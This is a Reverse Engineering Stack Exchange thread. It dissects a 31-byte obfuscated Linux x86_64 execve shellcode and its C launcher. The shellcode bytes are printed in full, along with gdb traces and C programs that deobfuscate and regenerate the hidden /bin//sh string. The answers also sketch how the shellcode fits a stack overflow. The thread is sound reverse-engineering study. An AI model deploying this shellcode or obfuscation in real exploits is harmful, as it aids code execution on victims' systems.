{
    "title": "What do the 20 lines of executable code in this exploit do?",
    "link": "https://reverseengineering.stackexchange.com/questions/11403/what-do-the-20-lines-of-executable-code-in-this-exploit-do",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I stumbled upon this 31 bytes of <a href=\"https://www.exploit-db.com/exploits/38815/\">Linux x86_64 Polymorphic execve Shellcode</a>, posted by the author \"d4sh&amp;r\":</p>\n<p>The code seems to be a combination of assembly and C and looks like this:</p>\n<pre><code>/*\n;Title: polymorphic execve shellcode\n;Author: d4sh&amp;r\n;Contact: https://mx.linkedin.com/in/d4v1dvc\n;Category: Shellcode\n;Architecture:linux x86_64\n;SLAE64-1379\n;Description:\n;Polymorphic shellcode in 31 bytes to get a shell \n;Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux\n\n;Compilation and execution\n;nasm -felf64 shell.nasm -o shell.o\n;ld shell.o -o shell\n;./shell\n\nglobal _start\n\n_start:\n    mul esi\n    push rdx\n    mov al,1                         \n    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh \n    rol rbx,24\n    shr rbx,1\n    push rbx\n    lea rdi, [rsp] ;address of /bin//sh\n    add al,58\n    syscall\n\n*/\n#include&lt;stdio.h&gt;\n//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode\nunsigned char code[] = \"\\xf7\\xe6\\x52\\xb0\\x01\\x48\\xbb\\xdc\\x5e\\x5e\\xe6\\xd0\\x5e\\xc4\\xd2\\x48\\xc1\\xc3\\x18\\x48\\xd1\\xeb\\x53\\x48\\x8d\\x3c\\x24\\x04\\x3a\\x0f\\x05\";\n\nmain()\n{\n   int (*ret)()=(int(*)()) code;\n    ret();\n}\n</code></pre>\n<p>I was curious, what do each of the lines 17-40 do, specifically, and how does this accomplish an exploit?</p>\n<p>(Line 17 is the one with the expression \"global _start\")</p>\n</div>",
    "votes": "5",
    "answers": 2,
    "views": "2k",
    "tags": [
        "assembly",
        "c"
    ],
    "user": null,
    "time": "Nov 26, 2015 at 1:22",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p><strong>EDIT:</strong> @EnricoGhirardi Thanks for pointing the <strong>mul esi</strong> inaccuracy I previously posted!</p>\n<p>To start out, the first instruction <strong>mul esi</strong> zeroes out <strong>rax</strong> and <strong>rdx</strong> in the example below (this is only because <strong>rsi</strong> is 0 to begin with). The least significant bits will be stored in <strong>rax</strong> and the most significant bits will be stored in <strong>rdx</strong>. Both of these registers will be zero. We can verify this with the following after compiling the test code:</p>\n<pre><code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode\ngdb shellcode\n\n**BANNER SNIPPED**\n\nDump of assembler code for function main:\n   0x00000000004004ed &lt;+0&gt;:     push   %rbp\n   0x00000000004004ee &lt;+1&gt;:     mov    %rsp,%rbp\n   0x00000000004004f1 &lt;+4&gt;:     sub    $0x10,%rsp\n   0x00000000004004f5 &lt;+8&gt;:     movq   $0x601060,-0x8(%rbp)\n   0x00000000004004fd &lt;+16&gt;:    mov    -0x8(%rbp),%rdx\n   0x0000000000400501 &lt;+20&gt;:    mov    $0x0,%eax\n   0x0000000000400506 &lt;+25&gt;:    callq  *%rdx\n   0x0000000000400508 &lt;+27&gt;:    leaveq \n   0x0000000000400509 &lt;+28&gt;:    retq   \nEnd of assembler dump.\n(gdb) b *0x0000000000400506\nBreakpoint 1 at 0x400506\n(gdb) c\nThe program is not being run.\n(gdb) r\n\n\nBreakpoint 1, 0x0000000000400506 in main ()\n(gdb) si\n0x0000000000601060 in code ()\n(gdb) disas\nDump of assembler code for function code:\n=&gt; 0x0000000000601060 &lt;+0&gt;:     mul    %esi\n   0x0000000000601062 &lt;+2&gt;:     push   %rdx\n   0x0000000000601063 &lt;+3&gt;:     mov    $0x1,%al\n   0x0000000000601065 &lt;+5&gt;:     movabs $0xd2c45ed0e65e5edc,%rbx\n   0x000000000060106f &lt;+15&gt;:    rol    $0x18,%rbx\n   0x0000000000601073 &lt;+19&gt;:    shr    %rbx\n   0x0000000000601076 &lt;+22&gt;:    push   %rbx\n   0x0000000000601077 &lt;+23&gt;:    lea    (%rsp),%rdi\n   0x000000000060107b &lt;+27&gt;:    add    $0x3a,%al\n   0x000000000060107d &lt;+29&gt;:    syscall \n   0x000000000060107f &lt;+31&gt;:    add    %al,(%rax)\nEnd of assembler dump.\n(gdb) i r rax rdx\nrax            0x0      0\nrdx            0x601060 6295648\n(gdb) si\n0x0000000000601062 in code ()\n(gdb) i r rax rdx\nrax            0x0      0\nrdx            0x0      0\n</code></pre>\n<p>As we can see, rax and rdx are both 0, which means that esi (or rsi) has been multiplied by zero.</p>\n<p>This is important because the shellcode eventually uses a <strong>syscall</strong> on line 29. We can see that syscall on line 29 is preceded by <strong>add al,58</strong> where al is already 1, therefore the rax register will hold a value of 59. </p>\n<p>The number <strong>59</strong> is the index for <strong>execve</strong> in the <a href=\"https://filippo.io/linux-syscall-table/\" rel=\"nofollow noreferrer\">Linux x86_64 syscall table</a> </p>\n<p><strong>execve</strong> will execute /bin//sh. Let's check out the function prototype:</p>\n<pre><code>int execve(const char *filename, char *const argv[], \n       char *const envp[]); \n</code></pre>\n<p>According to the prototype's <a href=\"http://www.tutorialspoint.com/unix_system_calls/execve.htm\" rel=\"nofollow noreferrer\">description</a>, <strong><em>filename</em></strong> must be either a binary executable, or a script starting with a line of the form \"#! interpreter [arg]\"</p>\n<p>We will see that eventually the shellcode passed <strong>/bin//sh</strong> as this argument.</p>\n<p><strong>argv</strong> are just the arguments passed to the binary. In this case, the arguments are NULL because as we have seen before, the <strong>rsi</strong> register was previously zeroed out on line 20.</p>\n<p>Similarly, <strong>envp</strong> are the environment arguments passed to the binary. Again, there are none because we have seen that the <strong>mul %esi</strong> instruction has zeroed out both <strong>rsi</strong> and <strong>rdx</strong>. In x86_64 Linux, the <strong>rsi</strong> and <strong>rdx</strong> registers are the second and third arguments to <strong>execve()</strong> respectively.</p>\n<p>You can find more information on x86_64 calling conventions <a href=\"https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64\">here</a> to see how arguments are passed into functions. </p>\n<p>Finally, the first argument in <strong>execve</strong> is <strong>/bin//sh</strong>, which is eventually passed to the <strong>edi</strong> register. <strong>edi</strong> holds the first function argument in Linux x86_64 assembly.</p>\n<p>The interesting part is that this is <strong>polymorphic shellcode</strong>. We can think of polymorphic shellcode as obfuscated machine instructions that deobfuscate themselves upon execution.</p>\n<p>On line 23, the hex string <strong>0xd2c45ed0e65e5edc</strong> in ascii is <strong>ÒÄ^Ðæ^^Ü</strong> which is clearly obfuscated.</p>\n<p>Lines 24 and 25 deobfuscate this string and we get <strong>0x68732f2f6e69622f</strong> which is <strong>hs//nib/</strong> in ascii. This is <strong>/bin//sh</strong> spelt backwards because the argument is passed <strong>to execve()</strong> in <a href=\"https://en.wikipedia.org/wiki/Endianness\" rel=\"nofollow noreferrer\">little endian byte order</a>.</p>\n<p>For proof of concept, you can run the code in gdb, or use the following deobfuscator I wrote:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;inttypes.h&gt;\n\nuint64_t rol(uint64_t v, unsigned int bits)\n{\n  return (v&lt;&lt;bits) | (v&gt;&gt;(8*sizeof(uint64_t)-bits));\n}\n\nint main(void)\n{\n  uint64_t obfuscated = 0xd2c45ed0e65e5edc;\n  uint64_t deobfuscated = rol(obfuscated, 24);\n  deobfuscated /= 2;\n  printf(\"0x%\" PRIx64 \"\\n\", deobfuscated);\n  return 0;\n}\n</code></pre>\n<p>You will get the deobfuscated hex string <strong>0x68732f2f6e69622f</strong> which again, is <strong>hs//nib/</strong> in ascii.</p>\n<p>Line 26 pushes the deobfuscated /bin//sh on top of the stack (i.e. in the <strong>rsp</strong> register) and line 27 loads the address pointing to the string <strong>/bin//sh</strong> into <strong>rdi</strong>. Again, please note that this string is being passed in little endian byte ordering. Now we can clearly see that <strong>/bin//sh</strong> is the first argument in <strong>execve()</strong></p>\n<p>Then, the shell is executed on line 29.</p>\n<p>Below is a commented pseudocode summary:</p>\n<pre><code>_start:\n    mul esi                     ; When this shellcode is executed, rsi and rdx become 0 because they are multiplied by rax which is 0, in Linux x86_64 assembly, rsi is the second argument in a function\n    push rdx                    ; save rdx (i.e. the buffer pointer to the shellcode), rdx is also the third argument passed to a syscall in x86_64\n    mov al,1                    ; used for obfuscation since mov al, 59 followed by syscall may look suspicious                       \n    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh obfuscated \n    rol rbx,24                  ; Deobfuscate the hex string /bin//sh\n    shr rbx,1                   ; Division by 2 to further deobfuscate /bin//sh\n    push rbx                    ; Push the hex string on the top of the stack [in rsp]\n    lea rdi, [rsp]              ; Load /bin//sh into rdi in little endian\n                                ; in linux 86_64 the first argument is passed to rdi during a syscall\n    add al,58                   ; al = 59 i.e. call execve\n    syscall                     ; execve(\"/bin//sh\", 0, *shellcode_buffer)\n</code></pre>\n<p>As for the C code, the machine instructions that represent the compiled assembly from lines 17 - 29 are stored in a global variable. We can use the following commands to check the bytes from the shellcode:</p>\n<pre><code>    $ nasm -felf64 shell.asm -o shell.o\n    $ ld shell.o -o shell\n    $ xxd shell\n\n    CONTENT SNIPPED\n    00000080: f7e6 52b0 0148 bbdc 5e5e e6d0 5ec4 d248  ..R..H..^^..^..H\n    00000090: c1c3 1848 d1eb 5348 8d3c 2404 3a0f 0500  ...H..SH.&lt;$.:...\n</code></pre>\n<p>As we can see, it matches with the following buffer in the C code:</p>\n<pre><code>unsigned char code[] = \"\\xf7\\xe6\\x52\\xb0\\x01\\x48\\xbb\\xdc\\x5e\\x5e\\xe6\\xd0\\x5e\\xc4\\xd2\\x48\\xc1\\xc3\\x18\\x48\\xd1\\xeb\\x53\\x48\\x8d\\x3c\\x24\\x04\\x3a\\x0f\\x05\";\n</code></pre>\n<p>The code in <strong>main</strong> simply casts the string buffer global variable into a function pointer which is then called, executing the polymorphic shellcode, and spawning a shell.</p>\n<p>Finally, shellcode is just a possible part of an exploit. An exploit consists of an input that is precisely tailored to a specific version of a program and OS. The shellcode can be part of the payload, but operating systems have became more secure adding ASLR (Address Stack Layout Randomization) and DEP (Data Execution Prevention), so generally it is more practical to overwrite a function pointer in to GOT (Global Offset Table) than to inject shellcode into a buffer. Assuming that you were performing a generic stack buffer overflow, the buffer would have to be at least 0x19 bytes long. You would also need some more space to compensate for the rest of the exploit. In other words, you would need a buffer with enough space to fit the shellcode and the rest of the exploit so that you could overwrite the RET address on the stack to redirect program execution (RIP/EIP) to your shellcode. </p>\n<p>This is just an example, but there are many more ways this shellcode can be used in a exploit. </p>\n<p>Taking a few steps back, this shellcode could fail if <strong>esi/rsi</strong> is not 0 to begin with because if it is not zero, then we will have a second argument passed into <strong>execve()</strong> and possibly even a third agument if the result from the instruction <strong>mul esi</strong> overflows into <strong>edx</strong>. The shellcode would be more reliable if there were an <strong>xor esi, esi</strong> instruction preceeding the <strong>mul</strong> <strong>esi</strong> instruction.</p>\n<p>We also might think how the exploit developer came up with the obfuscated hex string <strong>0xd2c45ed0e65e5edc</strong>. They simply took original string <strong>hs//nib/</strong> and applied the deobfuscating instructions in reverse order. You can use the following code for proof of concept:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;inttypes.h&gt;\n\nuint64_t ror(uint64_t v, unsigned int bits)\n{\n  return (v&gt;&gt;bits) | (v&lt;&lt;(8*sizeof(uint64_t)-bits));\n}\n\nint main(void)\n{\n  uint64_t deobfuscated = 0x68732f2f6e69622f;\n  uint64_t obfuscated = deobfuscated * 2;\n  obfuscated = ror(obfuscated, 24);\n  printf(\"0x%\" PRIx64 \"\\n\", obfuscated);\n  return 0;\n}\n</code></pre>\n<p>You should get the original obfuscated hex string <strong>0xd2c45ed0e65e5edc</strong>.</p>\n</div>",
            "votes": "10",
            "user": "Community",
            "time": "May 23, 2017 at 12:37",
            "is_accepted": true,
            "comments": [
                {
                    "user": "user14246",
                    "text": "<span class=\"comment-copy\">thank you @itsbriany for the exhaustive answer and all those references.</span>",
                    "time": null
                },
                {
                    "user": "mikalai",
                    "text": "<span class=\"comment-copy\">Great answer! But the code in question is far from being polymorphic.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>The answer above is correct for the most part but it includes some inaccuracies. I can't comment so I'll add the corrections in this answer.</p>\n<p>First I don't think this is a good shellcode since it takes an assumption on both %rax and %rsi. \n@itsbriany correctly points out that %rax is zero, but that is the case only in the specific launcher that the author wrote.\nWhen defining the ret function the number of arguments isn't specified, making it for the C standard a variadic function. For the x86_64 ABI, if a function has variable arguments then AL (which is part of EAX) is expected to hold the number of vector registers used to hold arguments to that function.\nJust by changing the definition to ret like this:</p>\n<pre><code>int (*ret)(void)=(int(*)()) code;\n</code></pre>\n<p>results in a segmentation fault. \nThen the operation </p>\n<pre><code>mul esi\n</code></pre>\n<p>doesn't zero out %esi as the other answers implies. In this case it multiplies %esi and %eax and stores upper bits in %edx lower bits in %eax, thus clearing %edx as a result. %esi is never modified and in fact it still points to the argv array of the original program. In another program where %esi has some invalid values the shell code won't work either. \nAlso %edx is pushed on the stack for no reason it seems.</p>\n</div>",
            "votes": "6",
            "user": "Enrico Ghirardi",
            "time": "Nov 26, 2015 at 13:19",
            "is_accepted": false,
            "comments": []
        }
    ]
}